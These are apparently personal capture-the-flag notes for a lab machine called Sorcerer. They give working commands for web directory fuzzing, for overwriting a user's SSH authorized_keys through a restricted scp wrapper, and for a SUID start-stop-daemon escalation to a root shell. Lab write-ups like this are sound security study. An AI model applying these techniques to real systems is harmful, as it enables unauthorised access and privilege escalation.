#box

*Created: 1/2/2026*

### Step 1

**Tags:** #Web-Enumeration #Web-Applications

**Command:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.141.100:7742/FUZZ -c -ic
```

*Port: 7742*

> 
> A ffuf scan highlights the presence of a folder called /zipfiles/ on port 7742. Inside of it we find zipfiles and one of the, max.zip contains the SSH set for that user

---

### Step 2

**Tags:** #SSH #SCP #SSH_Authorized_Keys

**Command:**
```bash
scp -O -i id_rsa malicious_authorized_keys max@192.168.126.100:/home/max/.ssh/authorized_keys
```

*Port: 22 | Asciinema Cast: [Step 2](attachments/Sorcerer-1.cast)*

> 
> While trying to authenticate in SSH we realize that we're getting denied the access. By opening the authorized_keys we discover that upon authenticating a script called scp_wrapper.sh is recalled
> 
> The script called contains the following:
> 
```bash
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
```
> 
> This script is also recalled, in the authorized_keys file whenever an authentication try is performed:
> 
```text
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```
> 
> This passage is subtle, but basically we're going to follow the following logic. Since we're forced to run a scp command due to the `scp_wrapper.sh` file, we'll clone the existing `authorized_keys` file, alter it removing the execution of the shell script and all the other constraints (such as `no-pty`) and then copy it inside the target machine throughout the `scp` command.
> This will fundamentally overwrite the target `authorized_keys` permitting us to effectively authenticate into the machine right after through a normal SSH authentication
> 
> The final version of the authorized keys will look like the following:
```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```
> 
> Basically equal to the one above, but stripped of the initial constraints, especially the `command="/home/max/scp_wrapper.sh"`
> 
> > If the system returns an error saying that the file is too big it's enough to add `-O` in the command to bypass the check. This flag will use the old scp protocol to transfer the file ignoring its size

---

### Step 3

**Tags:** #start-stop-daemon #binaries #Linux #SUID #SSH_Key_Authentication #SSH

🔗 **URL/Link:** https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid

**Command:**
```bash
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

> 
> The PE vector is achieved through a SUID on a binary called start-stop-daemon
> 
> Here I thought that to achieve root with a SUID the SUID had to be ran as sudo. However, this is not entirely true. In fact in this case, the sudo command was missing from the machine but we could anyways achieve the root of the machine.

---

